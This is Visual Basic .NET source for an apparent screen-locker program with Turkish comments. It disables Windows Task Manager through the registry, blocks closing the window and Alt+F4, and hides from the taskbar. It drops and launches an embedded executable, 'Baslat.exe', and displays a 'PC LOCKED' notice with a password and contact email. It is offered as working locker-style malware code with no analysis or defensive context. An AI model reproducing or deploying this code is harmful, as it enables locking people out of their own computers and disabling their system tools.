﻿Imports System.Media
Imports Microsoft.Win32
Public Class Form1
    Dim BTN2 As New SoundPlayer(My.Resources.BTN2)
    Public TaskMngKapalı As Boolean = False
    Protected Overrides ReadOnly Property CreateParams() As CreateParams
        Get
            Dim cp As CreateParams = MyBase.CreateParams
            Const CS_NOCLOSE As Integer = &H200
            cp.ClassStyle = cp.ClassStyle Or CS_NOCLOSE


            CS_NOCLOSE.ToString.Trim()
            Return cp
        End Get
    End Property
   


    Private Sub TextBox1_Click(sender As System.Object, e As System.EventArgs) Handles TextBox1.Click
        TextBox1.Text = ""
    End Sub

    Private Sub GrayButton1_Click(sender As System.Object, e As System.EventArgs) Handles GrayButton1.Click
        'BUTONA TIKLANINCA TEXTBOXA GİRİLEN KODU
        BTN2.Play()
        If TextBox1.Text = "12345" Then
            Form2.Show()
            Me.Hide()
        Else
            Label2.Visible = True

            'MSJ KODU

            Dim result As DialogResult = MessageBox.Show("WRONG PASSWORD !!!!", _
                              "PLEASE TRY AGAIN")
        End If
    End Sub
    Public Sub TaskMng_KodunuKilitle()
        'TaskManager (Görev Yöneticisini) Registerde  ( reg.SetValue("DisableTaskMgr", "1") değeri ile Kilitle
        Try
            Dim reg As Microsoft.Win32.RegistryKey
            Dim subKey As String = "Software\Microsoft\Windows\CurrentVersion\Policies\System"

            reg = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(subKey)
            reg.SetValue("DisableTaskMgr", "1")
            reg.Close()
            TaskMngKapalı = True

        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try

    End Sub


    Private Sub GrayCheck1_Click(sender As System.Object, e As System.EventArgs) Handles GrayCheck1.Click
        If GrayCheck1.Checked Then
            TextBox1.UseSystemPasswordChar = False
        Else
            TextBox1.UseSystemPasswordChar = True
        End If
    End Sub

    Private Sub GrayForm1_Click(sender As System.Object, e As System.EventArgs) Handles GrayForm1.Click

        Call TaskMng_KodunuKilitle()
        Try
            Dim dosyaVarmi = My.Computer.FileSystem.FileExists(Application.StartupPath & "\Baslat.exe")
            If dosyaVarmi = True Then
                'Dosya açıksa kapat
                Shell("taskkill /f /im " & "Baslat.exe", AppWinStyle.Hide)
            End If
            Kill(Application.StartupPath & "\Baslat.exe") 'mesaj vermeden Diskten siler

            'Çöp kutusuna taşıma mesajı veren silme kodu
            'My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\Başlat.exe", FileIO.UIOption.OnlyErrorDialogs, FileIO.RecycleOption.DeletePermanently, FileIO.UICancelOption.ThrowException)

        Catch ex As Exception
        End Try

    End Sub
    Private Sub TextBox3_TextChanged(sender As System.Object, e As System.EventArgs) Handles TextBox3.TextChanged
        If Not TextBox3.Text = TextBox4.Text Then
            Label3.Text = "CONTACT INFORMATION!!!"
            Label3.ForeColor = Color.Red
        Else
            Label3.Text = "CONTACT INFORMATION"
            Label3.ForeColor = Color.Green
        End If
    End Sub

    Private Sub GrayButton2_Click(sender As System.Object, e As System.EventArgs) Handles GrayButton2.Click
        BTN2.Play()
        On Error Resume Next
        Dim yol As String = Application.StartupPath & "\Baslat.exe"
        IO.File.WriteAllBytes(yol, My.Resources.Baslat)
        If IO.File.Exists(yol) Then Process.Start(yol)
        TextBox1.Text = "12345"
        TextBox2.Text = "yangshack@gmail.com"
        TextBox3.Text = "12345"
        TextBox4.Text = "PC LOCKED"
        Timer1.Enabled = True
        NotifyIcon1.BalloonTipIcon = ToolTipIcon.Info
        NotifyIcon1.BalloonTipTitle = "PC LOCKED"
        NotifyIcon1.BalloonTipText = "Your password has been created, please click LOGİN"
        NotifyIcon1.ShowBalloonTip(5000)

    End Sub

    Private Sub Timer1_Tick(sender As System.Object, e As System.EventArgs) Handles Timer1.Tick
        Form2.Show()
        Timer1.Enabled = False
    End Sub

    Private Sub Form1_FormClosing(sender As Object, e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        If e.CloseReason = CloseReason.WindowsShutDown Then
        Else

            e.Cancel = False

        End If
    End Sub
    Private Sub Form1_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        Dim reg As RegistryKey
        Dim subKey As String = "Software\Microsoft\Windows\CurrentVersion\Policies\System"

        reg = Registry.CurrentUser.CreateSubKey(subKey)
        reg.SetValue("DisableTaskMgr", "1")
        reg.Close()
        ShowInTaskbar = False ' görev çubugundan gizler
    End Sub

    Private Sub Form1_KeyDown(sender As Object, e As System.Windows.Forms.KeyEventArgs) Handles Me.KeyDown
        If (e.Alt) And (e.KeyValue = Keys.F4) Then
            e.Handled = True
        End If
    End Sub

    Private Sub GrayButton3_Click(sender As System.Object, e As System.EventArgs) Handles GrayButton3.Click
        Timer1.Enabled = True
    End Sub
End Class